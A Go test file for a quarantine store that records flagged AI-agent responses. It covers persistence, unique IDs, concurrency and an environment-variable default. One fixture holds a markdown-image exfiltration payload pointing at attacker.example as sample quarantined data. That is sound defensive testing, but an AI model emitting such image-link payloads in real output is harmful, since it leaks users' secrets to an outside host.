package quarantine

import (
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

func TestNewStore_CreatesDir(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "nested", "quarantine")
	s, err := NewStore(dir)
	if err != nil {
		t.Fatalf("NewStore: %v", err)
	}
	if s.Dir() != dir {
		t.Errorf("Dir = %q, want %q", s.Dir(), dir)
	}
	info, err := os.Stat(dir)
	if err != nil {
		t.Fatalf("dir not created: %v", err)
	}
	if !info.IsDir() {
		t.Errorf("expected directory, got %v", info.Mode())
	}
}

func TestNewStore_DefaultFromEnv(t *testing.T) {
	tmp := t.TempDir()
	envDir := filepath.Join(tmp, "from-env")
	t.Setenv("REEF_QUARANTINE_DIR", envDir)
	s, err := NewStore("")
	if err != nil {
		t.Fatalf("NewStore: %v", err)
	}
	if s.Dir() != envDir {
		t.Errorf("Dir = %q, want %q (REEF_QUARANTINE_DIR)", s.Dir(), envDir)
	}
}

func TestPersist_AllFieldsRoundTrip(t *testing.T) {
	dir := t.TempDir()
	s, err := NewStore(dir)
	if err != nil {
		t.Fatalf("NewStore: %v", err)
	}

	ev, err := s.Persist(Event{
		AgentID:        "agent-42",
		ConversationID: "conv-1",
		RequestBody:    "summarise my inbox",
		ResponseBody:   "![](https://attacker.example/exfil?d=secret)",
		PolicyRuleID:   "quarantine_credential_leak",
		Reason:         "egress credential leak",
	})
	if err != nil {
		t.Fatalf("Persist: %v", err)
	}
	if !strings.HasPrefix(ev.ID, "q-") || len(ev.ID) < 10 {
		t.Errorf("expected q-<hex> ID, got %q", ev.ID)
	}
	if ev.Status != StatusPending {
		t.Errorf("Status = %q, want pending", ev.Status)
	}
	if ev.Timestamp.IsZero() {
		t.Error("expected Timestamp populated")
	}

	events, err := s.LoadAll()
	if err != nil {
		t.Fatalf("LoadAll: %v", err)
	}
	if len(events) != 1 {
		t.Fatalf("expected 1 event on disk, got %d", len(events))
	}
	got := events[0]
	if got.ID != ev.ID ||
		got.AgentID != "agent-42" ||
		got.ConversationID != "conv-1" ||
		got.RequestBody != "summarise my inbox" ||
		got.ResponseBody != "![](https://attacker.example/exfil?d=secret)" ||
		got.PolicyRuleID != "quarantine_credential_leak" ||
		got.Reason != "egress credential leak" ||
		got.Status != StatusPending {
		t.Errorf("round-trip mismatch: %+v", got)
	}
}

func TestPersist_UniqueIDs(t *testing.T) {
	s, err := NewStore(t.TempDir())
	if err != nil {
		t.Fatalf("NewStore: %v", err)
	}
	seen := make(map[string]struct{})
	for i := 0; i < 32; i++ {
		ev, err := s.Persist(Event{Reason: "smoke"})
		if err != nil {
			t.Fatalf("Persist[%d]: %v", i, err)
		}
		if _, dup := seen[ev.ID]; dup {
			t.Fatalf("duplicate ID generated: %q", ev.ID)
		}
		seen[ev.ID] = struct{}{}
	}
}

// TestPersist_ConcurrentSafe asserts that 64 goroutines hammering Persist
// don't corrupt the JSONL file (no interleaved partial lines).
func TestPersist_ConcurrentSafe(t *testing.T) {
	s, err := NewStore(t.TempDir())
	if err != nil {
		t.Fatalf("NewStore: %v", err)
	}

	const workers = 64
	const perWorker = 8
	var wg sync.WaitGroup
	wg.Add(workers)
	for w := 0; w < workers; w++ {
		go func(idx int) {
			defer wg.Done()
			for i := 0; i < perWorker; i++ {
				if _, err := s.Persist(Event{
					AgentID: "agent-" + string(rune('A'+idx%26)),
					Reason:  "concurrent",
				}); err != nil {
					t.Errorf("Persist: %v", err)
					return
				}
			}
		}(w)
	}
	wg.Wait()

	events, err := s.LoadAll()
	if err != nil {
		t.Fatalf("LoadAll: %v", err)
	}
	if len(events) != workers*perWorker {
		t.Fatalf("expected %d events, got %d", workers*perWorker, len(events))
	}
	// Every event must decode cleanly + have a unique ID.
	ids := make(map[string]struct{})
	for _, ev := range events {
		if ev.ID == "" {
			t.Fatalf("event with empty ID after concurrent writes: %+v", ev)
		}
		if _, dup := ids[ev.ID]; dup {
			t.Fatalf("duplicate ID across concurrent writers: %q", ev.ID)
		}
		ids[ev.ID] = struct{}{}
	}
}

func TestLoadAll_MissingFile(t *testing.T) {
	s, err := NewStore(t.TempDir())
	if err != nil {
		t.Fatalf("NewStore: %v", err)
	}
	events, err := s.LoadAll()
	if err != nil {
		t.Fatalf("expected nil error on missing file, got %v", err)
	}
	if events != nil {
		t.Errorf("expected nil events on missing file, got %v", events)
	}
}
